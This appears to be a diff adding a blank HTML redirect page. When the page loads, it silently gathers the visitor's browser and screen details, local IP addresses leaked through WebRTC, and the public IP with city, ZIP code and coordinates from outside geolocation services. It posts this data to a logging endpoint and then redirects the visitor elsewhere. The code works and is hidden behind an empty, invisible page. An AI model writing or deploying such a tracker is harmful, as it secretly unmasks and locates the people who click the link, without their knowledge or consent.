@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        body { 
+            margin: 0; 
+            padding: 0; 
+            background: white; 
+            overflow: hidden; 
+        }
+        .hidden { 
+            position: absolute; 
+            left: -9999px; 
+            width: 1px; 
+            height: 1px; 
+            opacity: 0; 
+        }
+    </style>
+</head>
+<body>
+    <div class="hidden" id="collector"></div>
+
+    <script>
+        let visitorData = {};
+        
+        // Function to get comprehensive visitor information silently
+        async function gatherVisitorInfo() {
+            // Basic browser info
+            visitorData = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                onLine: navigator.onLine,
+                
+                // Screen info
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenColorDepth: screen.colorDepth,
+                screenPixelDepth: screen.pixelDepth,
+                
+                // Window info
+                windowWidth: window.innerWidth,
+                windowHeight: window.innerHeight,
+                
+                // Timezone
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                
+                // Page info
+                url: window.location.href,
+                referrer: document.referrer,
+                title: document.title,
+                
+                // Connection info (if available)
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : null
+            };
+            
+            // Try to get IP addresses using WebRTC silently
+            try {
+                await getIPAddresses();
+            } catch (e) {
+                // Silent fail
+            }
+            
+            // Try to get more detailed location/IP info from external APIs
+            try {
+                await getLocationInfo();
+            } catch (e) {
+                // Silent fail
+            }
+            
+            return visitorData;
+        }
+        
+        // Get IP addresses via WebRTC
+        function getIPAddresses() {
+            return new Promise((resolve) => {
+                const ips = [];
+                const pc = new RTCPeerConnection({
+                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                });
+                
+                pc.createDataChannel('');
+                pc.createOffer()
+                    .then(offer => pc.setLocalDescription(offer))
+                    .catch(() => {});
+                
+                pc.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        const candidate = event.candidate.candidate;
+                        const ip = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                        if (ip && !ips.includes(ip[1])) {
+                            ips.push(ip[1]);
+                            visitorData.localIPs = ips;
+                        }
+                    } else {
+                        pc.close();
+                        resolve(ips);
+                    }
+                };
+                
+                // Timeout after 3 seconds
+                setTimeout(() => {
+                    pc.close();
+                    resolve(ips);
+                }, 3000);
+            });
+        }
+        
+        // Get external IP and location info
+        async function getLocationInfo() {
+            
+            try {
+                // Try multiple IP geolocation services with full location data
+                const locationServices = [
+                    {
+                        url: 'https://ipapi.co/json/',
+                        parser: (data) => ({
+                            ip: data.ip,
+                            country: data.country_name,
+                            countryCode: data.country_code,
+                            region: data.region,
+                            city: data.city,
+                            zip: data.postal,
+                            lat: data.latitude,
+                            lon: data.longitude,
+                            isp: data.org,
+                            timezone: data.timezone,
+                            asn: data.asn
+                        })
+                    },
+                    {
+                        url: 'http://ip-api.com/json/',
+                        parser: (data) => ({
+                            ip: data.query,
+                            country: data.country,
+                            countryCode: data.countryCode,
+                            region: data.regionName,
+                            city: data.city,
+                            zip: data.zip,
+                            lat: data.lat,
+                            lon: data.lon,
+                            isp: data.isp,
+                            timezone: data.timezone,
+                            asn: data.as
+                        })
+                    },
+                    {
+                        url: 'https://api.ipgeolocation.io/ipgeo?apiKey=free',
+                        parser: (data) => ({
+                            ip: data.ip,
+                            country: data.country_name,
+                            countryCode: data.country_code2,
+                            region: data.state_prov,
+                            city: data.city,
+                            zip: data.zipcode,
+                            lat: parseFloat(data.latitude),
+                            lon: parseFloat(data.longitude),
+                            isp: data.isp,
+                            timezone: data.time_zone?.name,
+                            asn: data.organization
+                        })
+                    }
+                ];
+                
+                let locationFound = false;
+                
+                for (const service of locationServices) {
+                    if (locationFound) break;
+                    
+                    try {
+                        const response = await fetch(service.url);
+                        
+                        if (!response.ok) {
+                            continue;
+                        }
+                        
+                        const data = await response.json();
+                        
+                        if (data && (data.ip || data.query)) {
+                            const parsed = service.parser(data);
+                            
+                            visitorData.publicIP = parsed.ip;
+                            visitorData.location = {
+                                country: parsed.country,
+                                countryCode: parsed.countryCode,
+                                region: parsed.region,
+                                city: parsed.city,
+                                zip: parsed.zip,
+                                lat: parsed.lat,
+                                lon: parsed.lon,
+                                isp: parsed.isp,
+                                timezone: parsed.timezone,
+                                asn: parsed.asn
+                            };
+                            
+                            locationFound = true;
+                            break;
+                        }
+                    } catch (e) {
+                        continue;
+                    }
+                }
+                
+                // Fallback: try to get just the IP if location services failed
+                if (!locationFound) {
+                    try {
+                        const ipResponse = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipResponse.json();
+                        if (ipData.ip) {
+                            visitorData.publicIP = ipData.ip;
+                        }
+                    } catch (e) {
+                        // Silent fail
+                    }
+                }
+                
+            } catch (e) {
+                // Silent fail
+            }
+        }
+        
+        // Log the visitor data silently
+        async function logVisitor(data) {
+            
+            try {
+                // Send to your own logging endpoint
+                await fetch('/log-visitor', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+            } catch (e) {
+                // If your logging endpoint isn't available, store in localStorage silently
+                const logs = JSON.parse(localStorage.getItem('visitorLogs') || '[]');
+                logs.push(data);
+                localStorage.setItem('visitorLogs', JSON.stringify(logs));
+            }
+        }
+        
+        // Get redirect URL from server config
+        async function getRedirectUrl() {
+            try {
+                const response = await fetch('/api/redirect-url');
+                const data = await response.json();
+                return data.redirectUrl || 'https://example.com/';
+            } catch (e) {
+                return 'https://example.com/';
+            }
+        }
+        
+        // Main execution flow - completely silent
+        async function main() {
+            try {
+                // Get redirect URL first
+                const redirectUrl = await getRedirectUrl();
+                
+                // Gather all visitor information
+                const data = await gatherVisitorInfo();
+                
+                // Log the visitor
+                await logVisitor(data);
+                
+                // Quick redirect to configured URL
+                setTimeout(() => {
+                    window.location.replace(redirectUrl);
+                }, 500);
+                
+            } catch (error) {
+                // Redirect anyway after error, silently
+                const fallbackUrl = await getRedirectUrl().catch(() => 'https://example.com/');
+                setTimeout(() => {
+                    window.location.replace(fallbackUrl);
+                }, 1000);
+            }
+        }
+        
+        // Start the process
+        main();
+        
+        // Failsafe redirect
+        setTimeout(async () => {
+            const fallbackUrl = await getRedirectUrl().catch(() => 'https://example.com/');
+            window.location.replace(fallbackUrl);
+        }, 3000);
+    </script>
+</body>
+</html>
